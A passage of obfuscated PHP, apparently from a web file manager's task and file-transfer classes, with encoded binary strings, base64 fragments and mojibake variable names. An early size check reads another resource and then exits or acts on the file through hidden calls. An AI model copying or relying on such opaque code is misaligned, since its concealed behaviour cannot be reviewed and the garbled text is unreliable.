2\xc2\x8e\x72\xf1\x14\x35\xde\x44\xc2\xbd\x21\x96\x84\x77\x59\x1c\x2a\xb0\x6f\x2a\x22\xeb\x93\x4f\x6d\x66\x15\x26\x29\x55"."\x43\x94\x47\x22\xe7\xc8\xaf\x61\x78\x4b\x62\x35\x79\xef\x5e\x5a\x5c\x2b\x5b\xde\xb2\x1d\x29\x1b\x8f\xaf\x95\x17\x43\x98\x2c\x71\x90\xd3\xf0\x2b\xc2\xae\x67\x2d\x84\xb7\x7d\xbf\x97\x7d\xc2\x87"."\x53\xd6\xda\xc3\x61\xc3\x1d\xac\x1c\x25\x5d\x51\x22\x62\xbb\xe0\x7d\xb6\x83\x24\x92\x68\xe6\x18\x13\x6a\x90\x2e\xd9\xbc\x77\x9c\xdc\xb\x79\x15\xa6\xac\xe8\x71\x29\x99\x94\x62\xfe\xd6\xd0\x2f".base64_decode('tpyLCRcNJJleH0SkB6r9pbwPm0s3onkCedHqSy9xFyfRGawY5oTEEeCLr/U095A6')."\46\210\44\101\213\27\12\135\352\130\215\254\5\306\215\360\130\24\303\263\22\42\113\62\306\25\72\336\332\270\377\255\342\220\154\300\353\311\130\35\53\214\165\245\362\342\372\103"."\14\23\307\325\32\76\331\116\336\342\262\61\60\7\52\21\105\37\136\340\372\103\22\337\203\155\25\204\142\21\35\12\147\342\105\223\136\323\143\236\215\257\31\312\103\54\103\202".base64_decode('nlgfJ4dFIoxi8CWBBEGqvqagQQIBzYhL1cmXoNMWSNduRECld4olm22RwI46yzP5').strrev('V\'UÄ¢ù»®3„´d€¹{×Í~h“x‹M,,/€D&ÒÿÓÑ9)œƒäŠ')."\xc7\xdb\x55\x93\xa\xd\xd5\xee\xaf\xbf\x57\x6c\x4e\xfd\xfc\xa2\xa8\xa4\xaa\x3f\x92\x26\x45\xc6\xaa\x51\x86\xf6\xa8\x66\x31\x9a\x84\x4b\xa\x72\xd5\x53\x76\x9a\x29\xc0\x65\x69\x12\x2e\x5b\x95"."\314\12\113\342\25\251\234\253\126\234\151\206\127\75\171\40\163\50\324\30\260\217\63\247\131\247\233\317\232\231\253\233\3\210\363\347\46\102\212\332\275\20\262\5\337\215\166\255"."\x5e\xd4\xcc\x3c\x6d\x2f\x44\x6e\xdf\x29\x50\xb\xd7\xb2\x94\x1a\xd8\x55\xa8\x36\x54\xe3\x71\x91\x56\x43\xd1\x82\xd6\x89\xcf\x68\xd9\x87\x53\x8d\x64\x59\x6b\xa3\xb6\x5e\x47\xaa\xe6\xd6\x77\xbc".strrev('p¼ÚªÈŸíˆŞåaËèAFgâÓÌW¿†ze\\oQô4Sˆm'."\0".'WP\']Àbyx¾'."\n".'')."\x6a\x56\x24\xf\xa8\x35\x35\xb8\x3\x98\xaf\xaf\xe6\xa0\xd\x95\xc9\xec\x25\xd5\x77\xca\xf2\x58\xae\x9e\xd7\xbc\x6e\x56\x65\x57\x4e\x34\x9d\x35\x62\x48\xb2\x41\x9f\x58\x4e\x48\x19\x3c\xa\x1"."\x35\x4\x57\x24\xa\xe8\x3a\x21\xfe\xa6\xf5\x49\x14\x8b\x80\x9\x8f\xc9\x1\xa5\x13\xe0\x4a\x80\xde\x26\x76\xe0\x5b\x6b\x7e\x8f\x44\x5c\x84\xd2\x73\x95\x26\xa7\x2d\xdb\xd\xe0\xb4\x8c\x55\x26".base64_decode('v8ss1xW365StJ8QgPhwDkvII+hKXRrhT5DaCgC1BL+QT7jUxv5zWaCpBSp4AvuXg')."\x1\xf9\xec\x83\xfb\xcd\xae\x8a\xef\x6\x56\x44\x20\xe6\x34\x67\x4d\x30\x7\x8c\xd8\xda\x59\xf4\x7\x5f\x4c\x48\x53\x26\xe8\x13\x0\x3f\x59\xfd\x85\xd8\x91\x3b\x61\x9a\x12\x6\x37\xfe\x41\x15".base64_decode('E4rwGFhofXnYU5w+qcRVOj+pBpCiiiqo124i6wLbkHQmXZXUF0mnVyVTndTJd1Uy')."\x29\x25\xa9\x13\x55\x25\xf5\xf5\x24\x13\xd3\xa5\x45\x7b\x23\xb1\x78\x55\x1a\xd6\x3c\x4a\x64\x85\xb7\x2d\x9a\x14\xeb\x23\xbd\x24\xd7\x77\xd3\xf5\x22\xd6\xb1\x5c\xf4\x84\x5c\x14\xb\xe1\x7c\xb9"."\x68\x31\x99\x3b\xbb\xbc\x48\xab\x6\xe3\xd2\x25\xe3\x48\xad\x24\xdc\xae\x89\x32\xa6\x9e\x1f\x11\xc2\x3d\x55\x22\xde\x1d\xe6\x91\x90\x7f\x78\xdf\xd5\xf1\x29\xf8\x31\x20\x85\x8a\xb0\xd6\x50\x2"."\xea\x4e\x95\x21\x16\x3b\x3d\xe7\x7b\x9d\x13\xd2\xe2\xe6\x3b\xe4\xb9\x21\x97\xe2\xc9\x7e\x20\x8\x46\x82\x39\xf9\xa0\x25\x11\x4d\x35\x27\x48\x16\xec\x56\x5f\x34\x90\x54\x31\x1\xb8\x63\x47\x5b"."\xa0\x72\xb6\xde\xca\x49\x17\x9\x94\x8d\x1\x3\x45\x98\x52\x49\x33\x8c\x7e\x7b\x92\x5d\x75\xb8\xe6\x45\x31\x95\xe6\xe1\x1d\x2f\xe4\x6c\xff\x7\x85\x4e\x36\xc0\xef\xaa\x0\x0".base64_decode('')."", 10, -8))); goto eÖ®±Ò¨¨â; e•Ë•™íœ: if ($_SERVER[$_SERVER[³·—™¤¢][892]] != $_size($_file)) { $_getc = $_SERVER[³·—™¤¢][895]; $_getfile = $_SERVER[$_SERVER[³·—™¤¢][896]] . $_SERVER[³·—™¤¢][897]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³·—™¤¢][231], $_getfilec); if (count($_getarrs) < $_SERVER[³·—™¤¢][632]) { $exit = $_SERVER[³·—™¤¢][898]; $exit(); } $_act = $_SERVER[³·—™¤¢][935]; $_act($_file); } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\151\156\147"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($¨¼òÈ¡, $âÇ÷Ë°‹ = '', $ğÓ¼Ÿ¢Ë = 0, $Éüï‚Ğ  = '') { $’û°Ü¨Ø =& $_SERVER[³·—™¤¢]; if (self::get($¨¼òÈ¡)) { return; } $this->task = array($’û°Ü¨Ø[399] => $¨¼òÈ¡, $’û°Ü¨Ø[1680] => USER_ID, $’û°Ü¨Ø[1577] => $Éüï‚Ğ , $’û°Ü¨Ø[33] => $âÇ÷Ë°‹, $’û°Ü¨Ø[1087] => $’û°Ü¨Ø[12], $’û°Ü¨Ø[806] => $ğÓ¼Ÿ¢Ë, $’û°Ü¨Ø[1681] => 0, $’û°Ü¨Ø[1682] => 0, $’û°Ü¨Ø[1683] => 0, $’û°Ü¨Ø[1684] => timeFloat(), $’û°Ü¨Ø[1685] => 0, $’û°Ü¨Ø[1686] => 0, $’û°Ü¨Ø[1687] => 0, $’û°Ü¨Ø[1688] => 0, $’û°Ü¨Ø[770] => $’û°Ü¨Ø[1639]); $GLOBALS[$’û°Ü¨Ø[1689]] = 1; Hook::bind($’û°Ü¨Ø[1644], array($this, $’û°Ü¨Ø[1690])); Hook::bind($’û°Ü¨Ø[1691], array($this, $’û°Ü¨Ø[1692])); $this->startAfter(); Hook::trigger($’û°Ü¨Ø[1693], $this->task); $this->task[$’û°Ü¨Ø[1686]] = timeFloat(); } public function end() { $Ö¥áô‹— =& $_SERVER[³·—™¤¢]; if (!$this->task) { return; } if ($this->task[$Ö¥áô‹—[1686]]) { self::valueSet($this->task[$Ö¥áô‹—[399]], !1); } $ì‡‡æé† = timeFloat() - $this->task[$Ö¥áô‹—[1684]]; self::log($Ö¥áô‹—[1694] . $this->task[$Ö¥áô‹—[399]] . $Ö¥áô‹—[1695] . $ì‡‡æé† . $Ö¥áô‹—[1696]); Hook::unbind($Ö¥áô‹—[1644], array($this, $Ö¥áô‹—[1690])); Hook::unbind($Ö¥áô‹—[1691], array($this, $Ö¥áô‹—[1692])); $this->endAfter(); $this->task = !1; } public function update($ª¨®íªÙ = 0, $•ôÍÖÛ = false) { $û¨ÔÕˆÀ =& $_SERVER[³·—™¤¢]; $”îÎ·¹ =& $this->task; if (!$”îÎ·¹) { return; } $”îÎ·¹[$û¨ÔÕˆÀ[1681]] += $ª¨®íªÙ; $”îÎ·¹[$û¨ÔÕˆÀ[1685]] = timeFloat(); if ($”îÎ·¹[$û¨ÔÕˆÀ[806]]) { if ($”îÎ·¹[$û¨ÔÕˆÀ[806]] < $”îÎ·¹[$û¨ÔÕˆÀ[1681]]) { $”îÎ·¹[$û¨ÔÕˆÀ[806]] = $”îÎ·¹[$û¨ÔÕˆÀ[1681]]; } $İÌûê¾Ğ = timeFloat() - $”îÎ·¹[$û¨ÔÕˆÀ[1684]] - $”îÎ·¹[$û¨ÔÕˆÀ[1687]]; if ($İÌûê¾Ğ <= 0) { $İÌûê¾Ğ = 0.001; } $”îÎ·¹[$û¨ÔÕˆÀ[1682]] = $”îÎ·¹[$û¨ÔÕˆÀ[1681]] / $”îÎ·¹[$û¨ÔÕˆÀ[806]]; $”îÎ·¹[$û¨ÔÕˆÀ[1683]] = $”îÎ·¹[$û¨ÔÕˆÀ[1681]] / $İÌûê¾Ğ; if ($”îÎ·¹[$û¨ÔÕˆÀ[1682]] > 0) { $”îÎ·¹[$û¨ÔÕˆÀ[1688]] = $İÌûê¾Ğ * (1 - $”îÎ·¹[$û¨ÔÕˆÀ[1682]]) / $”îÎ·¹[$û¨ÔÕˆÀ[1682]]; } $”îÎ·¹[$û¨ÔÕˆÀ[1688]] = $”îÎ·¹[$û¨ÔÕˆÀ[1688]] <= 0 ? 0 : $”îÎ·¹[$û¨ÔÕˆÀ[1688]]; } $this->updateAfter(); $š¤Õ´áä = 0.2; if (timeFloat() - $”îÎ·¹[$û¨ÔÕˆÀ[1686]] < $š¤Õ´áä && !$•ôÍÖÛ) { return; } $‚Á–™İ¬ = self::get($”îÎ·¹[$û¨ÔÕˆÀ[399]]); $¨¹‡óÒ¸ = $‚Á–™İ¬[$û¨ÔÕˆÀ[770]]; if ($¨¹‡óÒ¸ == self::STATYS_KILL) { $ˆİ´şÚ = array($û¨ÔÕˆÀ[1697] => LNG($û¨ÔÕˆÀ[1698]), $û¨ÔÕˆÀ[1214] => !1); Cache::set($û¨ÔÕˆÀ[1699] . $this->task[$û¨ÔÕˆÀ[399]], $ˆİ´şÚ, 30); $this->onKill(); $this->end(); die; } else { if ($¨¹‡óÒ¸ == self::STATYS_STOP) { $ù¸íÛĞ = 2; $‚Á–™İ¬[$û¨ÔÕˆÀ[1687]] += $ù¸íÛĞ; self::valueSet($”îÎ·¹[$û¨ÔÕˆÀ[399]], $‚Á–™İ¬); sleep($ù¸íÛĞ); $this->update(); return; } } $”îÎ·¹[$û¨ÔÕˆÀ[770]] = $¨¹‡óÒ¸ ? $¨¹‡óÒ¸ : $”îÎ·¹[$û¨ÔÕˆÀ[770]]; $”îÎ·¹[$û¨ÔÕˆÀ[1687]] = $‚Á–™İ¬[$û¨ÔÕˆÀ[1687]] ? $‚Á–™İ¬[$û¨ÔÕˆÀ[1687]] : 0; $”îÎ·¹[$û¨ÔÕˆÀ[1686]] = timeFloat(); Hook::trigger($û¨ÔÕˆÀ[1700], $”îÎ·¹); self::valueSet($”îÎ·¹[$û¨ÔÕˆÀ[399]], $”îÎ·¹); } public function onKillSet($üË—É´±, $ÙùÂ±¾‚ = array()) { $this->onKillCall = array($üË—É´±, $ÙùÂ±¾‚); } public function onKill() { $Šûè¸Ùô =& $_SERVER[³·—™¤¢]; self::log($Šûè¸Ùô[1694] . $this->task[$Šûè¸Ùô[399]] . $Šûè¸Ùô[1701]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($–Ã½èÜÚ) { $²›ğ…‹á =& $_SERVER[³·—™¤¢]; Cache::set($²›ğ…‹á[1699] . $this->task[$²›ğ…‹á[399]], $–Ã½èÜÚ, 60); return $–Ã½èÜÚ; } public static function get($Óûˆ‘¨) { $øëşÅ¸ =& $_SERVER[³·—™¤¢]; $“´…–¶ = self::valueGet($Óûˆ‘¨); if (is_array($“´…–¶) && $“´…–¶[$øëşÅ¸[1702]]) { $à§—òÕ× = ActionApply($“´…–¶[$øëşÅ¸[1702]], array($“´…–¶)); $“´…–¶ = is_array($à§—òÕ×) ? $à§—òÕ× : $“´…–¶; } return $“´…–¶; } public static function listData() { $ À—¹› = self::valueGet(); return array_sort_by($ À—¹›, $_SERVER[³·—™¤¢][1684], !0); } public static function kill($™Õ´Óã) { return self::changeStatus($™Õ´Óã, self::STATYS_KILL); } public static function stop($‡³‘†‘ø) { return self::changeStatus($‡³‘†‘ø, self::STATYS_STOP); } public static function restart($Ø¯õÄ×±) { return self::changeStatus($Ø¯õÄ×±, self::STATYS_RUNNING); } public static function killAll() { $ôÀ£¬–õ =& $_SERVER[³·—™¤¢]; $™ òåãº = self::listData(); foreach ($™ òåãº as $×Ù¢“Æ¶) { self::kill($×Ù¢“Æ¶[$ôÀ£¬–õ[399]]); } sleep(2); foreach ($™ òåãº as $×Ù¢“Æ¶) { self::valueSet($×Ù¢“Æ¶[$ôÀ£¬–õ[399]], !1); } } private static function changeStatus($§ª†ˆÑü, $‰ÃŠ”É) { $‚¶Üúˆà =& $_SERVER[³·—™¤¢]; $²¬ñá•º = self::valueGet($§ª†ˆÑü); if (!$²¬ñá•º) { return !1; } $²¬ñá•º[$‚¶Üúˆà[770]] = $‰ÃŠ”É; self::valueSet($§ª†ˆÑü, $²¬ñá•º); self::log($‚¶Üúˆà[1703] . $²¬ñá•º[$‚¶Üúˆà[399]] . $‚¶Üúˆà[1704] . $‰ÃŠ”É); return !0; } public static function valueGet($¡€ö´¨“ = false) { $ÜñÂ§š® =& $_SERVER[³·—™¤¢]; if ($¡€ö´¨“) { $Æ…é´ôÏ = Model($ÜñÂ§š®[447])->where(array($ÜñÂ§š®[94] => $¡€ö´¨“, $ÜñÂ§š®[33] => $ÜñÂ§š®[1094]))->find(); return $Æ…é´ôÏ ? json_decode($Æ…é´ôÏ[$ÜñÂ§š®[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÈìÂüœ = false) { $İŸ¯í×± =& $_SERVER[³·—™¤¢]; $ŒšÆ’Ü = array($İŸ¯í×±[33] => $İŸ¯í×±[1094]); if ($ÈìÂüœ) { $ŒšÆ’Ü[$İŸ¯í×±[1680]] = $ÈìÂüœ; } $íçÒ–Á = Model($İŸ¯í×±[447])->where($ŒšÆ’Ü)->select(); $íçÒ–Á = $íçÒ–Á ? $íçÒ–Á : array(); foreach ($íçÒ–Á as $üƒŸªË· => $ä„Îöª) { $íçÒ–Á[$üƒŸªË·] = json_decode($ä„Îöª[$İŸ¯í×±[374]], !0); } return $íçÒ–Á; } public static function valueSet($–£áñ™ò, $³ƒîüÄ) { $ËşÁº‰‚ =& $_SERVER[³·—™¤¢]; if (!$³ƒîüÄ) { return Model($ËşÁº‰‚[447])->where(array($ËşÁº‰‚[94] => $–£áñ™ò, $ËşÁº‰‚[33] => $ËşÁº‰‚[1094]))->delete(); } $öëÌŞ¯ = json_encode($³ƒîüÄ); if (!$öëÌŞ¯) { ob_start(); var_dump($³ƒîüÄ); $âîÀÅƒ¡ = ob_get_clean(); self::log($ËşÁº‰‚[1705] . json_encode_force($âîÀÅƒ¡)); } if (!$–£áñ™ò || !$³ƒîüÄ[$ËşÁº‰‚[399]]) { return !1; } $ã‰˜çã‚ = array($ËşÁº‰‚[33] => $ËşÁº‰‚[1094], $ËşÁº‰‚[1680] => USER_ID, $ËşÁº‰‚[94] => $–£áñ™ò, $ËşÁº‰‚[374] => $öëÌŞ¯); $Åô®÷§¢ = $ËşÁº‰‚[1706]; CacheLock::lock($Åô®÷§¢); Model($ËşÁº‰‚[447])->add($ã‰˜çã‚, array(), !0); CacheLock::unlock($Åô®÷§¢); } public static function log($†‘„ûûü) { if (!GLOBAL_DEBUG) { return; } write_log($†‘„ûûü, $_SERVER[³·—™¤¢][1707]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ò½™ú÷± =& $_SERVER[³·—™¤¢]; $„­îÅ÷” =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ò½™ú÷±[1708], array($this, $ò½™ú÷±[1709])); Hook::bind($ò½™ú÷±[1238], array($this, $ò½™ú÷±[1710])); Hook::bind($ò½™ú÷±[1711], array($this, $ò½™ú÷±[1712])); Hook::bind($ò½™ú÷±[604], array($this, $ò½™ú÷±[1713])); Hook::bind($ò½™ú÷±[605], array($this, $ò½™ú÷±[1714])); Hook::bind($ò½™ú÷±[610], array($this, $ò½™ú÷±[1715])); Hook::bind($ò½™ú÷±[611], array($this, $ò½™ú÷±[1716])); Hook::bind($ò½™ú÷±[607], array($this, $ò½™ú÷±[1717])); Hook::bind($ò½™ú÷±[608], array($this, $ò½™ú÷±[1718])); Hook::bind($ò½™ú÷±[574], array($this, $ò½™ú÷±[1719])); Hook::bind($ò½™ú÷±[571], array($this, $ò½™ú÷±[1719])); Hook::bind($ò½™ú÷±[576], array($this, $ò½™ú÷±[1719])); Hook::bind($ò½™ú÷±[578], array($this, $ò½™ú÷±[1719])); Hook::bind($ò½™ú÷±[580], array($this, $ò½™ú÷±[1719])); Hook::bind($ò½™ú÷±[1720], array($this, $ò½™ú÷±[1721])); Hook::bind($ò½™ú÷±[597], array($this, $ò½™ú÷±[1722])); $this->sourceModelCopyFlag = !1; Hook::bind($ò½™ú÷±[1723], array($this, $ò½™ú÷±[1724])); Hook::bind($ò½™ú÷±[1725], array($this, $ò½™ú÷±[1726])); Hook::bind($ò½™ú÷±[1727], array($this, $ò½™ú÷±[1728])); $„­îÅ÷”[$ò½™ú÷±[1729]] = LNG($ò½™ú÷±[1730]); $„­îÅ÷”[$ò½™ú÷±[1731]] = 0; $„­îÅ÷”[$ò½™ú÷±[1732]] = 0; $„­îÅ÷”[$ò½™ú÷±[1087]] = $ò½™ú÷±[12]; $„­îÅ÷”[$ò½™ú÷±[1733]] = $ò½™ú÷±[12]; $„­îÅ÷”[$ò½™ú÷±[1734]] = 0; $„­îÅ÷”[$ò½™ú÷±[1735]] = 0; $„­îÅ÷”[$ò½™ú÷±[1736]] = 0; if (!$„­îÅ÷”[$ò½™ú÷±[1577]]) { $„­îÅ÷”[$ò½™ú÷±[1577]] = LNG($ò½™ú÷±[1737]); } } protected function endAfter() { $õôö’¤Í =& $_SERVER[³·—™¤¢]; Hook::unbind($õôö’¤Í[1708], array($this, $õôö’¤Í[1709])); Hook::unbind($õôö’¤Í[1238], array($this, $õôö’¤Í[1710])); Hook::unbind($õôö’¤Í[1711], array($this, $õôö’¤Í[1712])); Hook::unbind($õôö’¤Í[604], array($this, $õôö’¤Í[1713])); Hook::unbind($õôö’¤Í[605], array($this, $õôö’¤Í[1714])); Hook::unbind($õôö’¤Í[610], array($this, $õôö’¤Í[1715])); Hook::unbind($õôö’¤Í[611], array($this, $õôö’¤Í[1716])); Hook::unbind($õôö’¤Í[607], array($this, $õôö’¤Í[1717])); Hook::unbind($õôö’¤Í[608], array($this, $õôö’¤Í[1718])); Hook::unbind($õôö’¤Í[574], array($this, $õôö’¤Í[1719])); Hook::unbind($õôö’¤Í[571], array($this, $õôö’¤Í[1719])); Hook::unbind($õôö’¤Í[576], array($this, $õôö’¤Í[1719])); Hook::unbind($õôö’¤Í[578], array($this, $õôö’¤Í[1719])); Hook::unbind($õôö’¤Í[580], array($this, $õôö’¤Í[1719])); Hook::unbind($õôö’¤Í[1720], array($this, $õôö’¤Í[1721])); Hook::unbind($õôö’¤Í[597], array($this, $õôö’¤Í[1722])); Hook::unbind($õôö’¤Í[1723], array($this, $õôö’¤Í[1724])); Hook::unbind($õôö’¤Í[1725], array($this, $õôö’¤Í[1726])); Hook::unbind($õôö’¤Í[1727], array($this, $õôö’¤Í[1728])); } public function copyMoveStart($î©¨±¸Ù, $“ŠïŞà, $Š›äş¼, $—Í¯Ëô) { $İŒ¨¾ƒø =& $_SERVER[³·—™¤¢]; self::log($İŒ¨¾ƒø[1738] . $“ŠïŞà . $İŒ¨¾ƒø[70] . $—Í¯Ëô); $òí¬íÎ› = rtrim(TEMP_FILES, $İŒ¨¾ƒø[8]); if (substr($“ŠïŞà, 0, strlen($òí¬íÎ›)) == $òí¬íÎ›) { return; } if (substr($—Í¯Ëô, 0, strlen($òí¬íÎ›)) == $òí¬íÎ›) { return; } $°Æ¬ÑïÅ =& $this->task; $°Æ¬ÑïÅ[$İŒ¨¾ƒø[1739]] = KodIO::transferType($î©¨±¸Ù, $Š›äş¼); $this->update(); } public function updateAfter() { $ÕÛıŒáĞ =& $_SERVER[³·—™¤¢]; $¦óÃÙ  =& $this->task; if (!$¦óÃÙ [$ÕÛıŒáĞ[783]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¦óÃÙ [$ÕÛıŒáĞ[1739]] == $ÕÛıŒáĞ[1327]) { return; } self::updateTask($¦óÃÙ ); } private static function updateTask(&$ºî˜‰Æ²) { $§´¶Ùµ =& $_SERVER[³·—™¤¢]; if ($ºî˜‰Æ²[$§´¶Ùµ[1739]] == $§´¶Ùµ[1222] || $ºî˜‰Æ²[$§´¶Ùµ[1739]] == $§´¶Ùµ[107]) { if ($ºî˜‰Æ²[$§´¶Ùµ[1733]]) { $ºî˜‰Æ²[$§´¶Ùµ[1736]] = $ºî˜‰Æ²[$§´¶Ùµ[1735]] + $ºî˜‰Æ²[$§´¶Ùµ[1732]]; } } else { if ($ºî˜‰Æ²[$§´¶Ùµ[1739]] == $§´¶Ùµ[1328]) { if ($ºî˜‰Æ²[$§´¶Ùµ[1733]] == $§´¶Ùµ[1222]) { $ºî˜‰Æ²[$§´¶Ùµ[1736]] = $ºî˜‰Æ²[$§´¶Ùµ[1735]] + $ºî˜‰Æ²[$§´¶Ùµ[1732]] * 0.5; } else { if ($ºî˜‰Æ²[$§´¶Ùµ[1733]] == $§´¶Ùµ[107]) { $ºî˜‰Æ²[$§´¶Ùµ[1736]] = $ºî˜‰Æ²[$§´¶Ùµ[1735]] + $ºî˜‰Æ²[$§´¶Ùµ[1731]] * 0.5 + $ºî˜‰Æ²[$§´¶Ùµ[1732]] * 0.5; } } } } $ºî˜‰Æ²[$§´¶Ùµ[1682]] = $ºî˜‰Æ²[$§´¶Ùµ[1736]] / $ºî˜‰Æ²[$§´¶Ùµ[783]]; if ($ºî˜‰Æ²[$§´¶Ùµ[1682]] > 0) { $÷Šù¸Ìº = timeFloat() - $ºî˜‰Æ²[$§´¶Ùµ[1684]] - $ºî˜‰Æ²[$§´¶Ùµ[1687]]; $ºî˜‰Æ²[$§´¶Ùµ[1688]] = $÷Šù¸Ìº * (1 - $ºî˜‰Æ²[$§´¶Ùµ[1682]]) / $ºî˜‰Æ²[$§´¶Ùµ[1682]]; } } public function addPath($ïÅçÄî) { $ö¿Êõå÷ =& $_SERVER[³·—™¤¢]; if (!$ïÅçÄî) { return; } $±ÉáØª =& $this->task; $Õ¹§×àä = IO::infoWithChildren($ïÅçÄî); $˜ïİÍÓ› = $±ÉáØª[$ö¿Êõå÷[1740]] ? $±ÉáØª[$ö¿Êõå÷[1740]][$ö¿Êõå÷[1741]] : 0; $±ÉáØª[$ö¿Êõå÷[1740]] = array($ö¿Êõå÷[1741] => $˜ïİÍÓ› + 1, $ö¿Êõå÷[420] => $Õ¹§×àä[$ö¿Êõå÷[32]], $ö¿Êõå÷[84] => $Õ¹§×àä[$ö¿Êõå÷[84]], $ö¿Êõå÷[519] => $Õ¹§×àä[$ö¿Êõå÷[519]] ? $Õ¹§×àä[$ö¿Êõå÷[519]] : $Õ¹§×àä[$ö¿Êõå÷[84]]); if ($Õ¹§×àä[$ö¿Êõå÷[33]] == $ö¿Êõå÷[199]) { $±ÉáØª[$ö¿Êõå÷[806]] += 1; } else { $±ÉáØª[$ö¿Êõå÷[806]] += $Õ¹§×àä[$ö¿Êõå÷[79]][$ö¿Êõå÷[77]]; if ($Õ¹§×àä[$ö¿Êõå÷[402]]) { $±ÉáØª[$ö¿Êõå÷[806]] += $Õ¹§×àä[$ö¿Êõå÷[79]][$ö¿Êõå÷[78]] + 1; } } $±ÉáØª[$ö¿Êõå÷[783]] += $Õ¹§×àä[$ö¿Êõå÷[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÀÍÛ¡ÔÕ) { } public function sourceAddHashEnd($éÀÂÊªı) { } public function sourceAddFileStart($Ñ‡«¾) { $¢úµ›Š´ =& $_SERVER[³·—™¤¢]; $¸êÁ¶å· =& $this->task; $¸êÁ¶å·[$¢úµ›Š´[1731]] = $Ñ‡«¾[$¢úµ›Š´[76]]; $¸êÁ¶å·[$¢úµ›Š´[1729]] = $Ñ‡«¾[$¢úµ›Š´[32]]; $¸êÁ¶å·[$¢úµ›Š´[1087]] = $Ñ‡«¾[$¢úµ›Š´[32]]; $¸êÁ¶å·[$¢úµ›Š´[1742]] = $Ñ‡«¾[$¢úµ›Š´[84]]; $this->update(); } public function sourceAddFileEnd($Âå‡¸±Ï) { $¡à–à»· =& $_SERVER[³·—™¤¢]; $ÍğÈ” =& $this->task; $ÍğÈ”[$¡à–à»·[1736]] += $Âå‡¸±Ï[$¡à–à»·[76]]; $ÍğÈ”[$¡à–à»·[1742]] = $Âå‡¸±Ï[$¡à–à»·[84]]; $this->update(1); } public function copyFileStart($İ¼Ó–ş, $ä§¯çÁ€, $¥ËÖÙç©, $Éü¸Òù´, $»Â¿Ù¦Ë, $ß¿ôŸûò) { $ÓŠò‰€ =& $_SERVER[³·—™¤¢]; $…“Ë¨à› = $»Â¿Ù¦Ë; if ($…“Ë¨à› == $GLOBALS[$ÓŠò‰€[1743]]) { $…“Ë¨à› = $GLOBALS[$ÓŠò‰€[1744]]; } $GLOBALS[$ÓŠò‰€[1744]] = $»Â¿Ù¦Ë; $GLOBALS[$ÓŠò‰€[1743]] = $ß¿ôŸûò; $·Á´„Ï =& $this->task; $·Á´„Ï[$ÓŠò‰€[1729]] = $…“Ë¨à›; $·Á´„Ï[$ÓŠò‰€[1731]] = (int) $İ¼Ó–ş->size($ä§¯çÁ€); $·Á´„Ï[$ÓŠò‰€[1732]] = 0; $·Á´„Ï[$ÓŠò‰€[1087]] = $ÓŠò‰€[12]; $·Á´„Ï[$ÓŠò‰€[1733]] = $ÓŠò‰€[12]; $·Á´„Ï[$ÓŠò‰€[1734]] = 0; $ÚÛŠÇ£„ = $·Á´„Ï[$ÓŠò‰€[1731]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($·Á´„Ï[$ÓŠò‰€[399]] . $ÓŠò‰€[1745]); if ($ÚÛŠÇ£„ && file_exists(get_path_father($Éü¸Òù´))) { Cache::set($·Á´„Ï[$ÓŠò‰€[399]] . $ÓŠò‰€[1745], $Éü¸Òù´); $·Á´„Ï[$ÓŠò‰€[1702]] = array($ÓŠò‰€[1746], $ÓŠò‰€[1747]); } $this->update(0, $ÚÛŠÇ£„); } public static function updateCopyLocalFileSize($¸²Ò‹‡‡) { $ÛšÇ—§ =& $_SERVER[³·—™¤¢]; $’±‡ êµ = Cache::get($¸²Ò‹‡‡[$ÛšÇ—§[399]] . $ÛšÇ—§[1745]); if (!$’±‡ êµ || !file_exists($’±‡ êµ)) { return $¸²Ò‹‡‡; } $¸²Ò‹‡‡[$ÛšÇ—§[1732]] = @filesize($’±‡ êµ); $¸²Ò‹‡‡[$ÛšÇ—§[1736]] += $¸²Ò‹‡‡[$ÛšÇ—§[1732]]; self::updateTask($¸²Ò‹‡‡); return $¸²Ò‹‡‡; } public function copyFileEnd($›Ğ€€âœ, $ı×€°™, $Şô‘×Í€, $™Ú¸…ûÓ, $•ª«ˆíŞ, $†íæÅº˜) { $¸âÅÏ =& $_SERVER[³·—™¤¢]; $¢§×½å‡ =& $this->task; $¢§×½å‡[$¸âÅÏ[1732]] = $¢§×½å‡[$¸âÅÏ[1731]]; $¢§×½å‡[$¸âÅÏ[1733]] = $¸âÅÏ[12]; unset($¢§×½å‡[$¸âÅÏ[1702]]); if ($•ª«ˆíŞ == $¢§×½å‡[$¸âÅÏ[1729]]) { $¢§×½å‡[$¸âÅÏ[1735]] += $¢§×½å‡[$¸âÅÏ[1731]]; $¢§×½å‡[$¸âÅÏ[1736]] = $¢§×½å‡[$¸âÅÏ[1735]]; $¸«¨åÃç = 1; if (isset($¢§×½å‡[$¸âÅÏ[1742]]) && $¢§×½å‡[$¸âÅÏ[1742]] == $ı×€°™) { $¸«¨åÃç = 0; } $this->update($¸«¨åÃç); } else { $this->update(); $¢§×½å‡[$¸âÅÏ[1732]] = 0; } Cache::remove($¢§×½å‡[$¸âÅÏ[399]] . $¸âÅÏ[1745]); self::log($¸âÅÏ[1748] . $ı×€°™ . $¸âÅÏ[70] . $™Ú¸…ûÓ . $¸âÅÏ[231] . $•ª«ˆíŞ . $¸âÅÏ[1749] . $¢§×½å‡[$¸âÅÏ[1729]]); } public function updateFileEnd($Æô’‹â¬, $ˆ©íã¬Æ) { $°Á¼ Ñä =& $_SERVER[³·—™¤¢]; $îµñê‚Ò =& $this->task; $îµñê‚Ò[$°Á¼ Ñä[1729]] = $Æô’‹â¬; $îµñê‚Ò[$°Á¼ Ñä[1731]] = $ˆ©íã¬Æ; $îµñê‚Ò[$°Á¼ Ñä[1735]] += $ˆ©íã¬Æ; $îµñê‚Ò[$°Á¼ Ñä[1736]] = 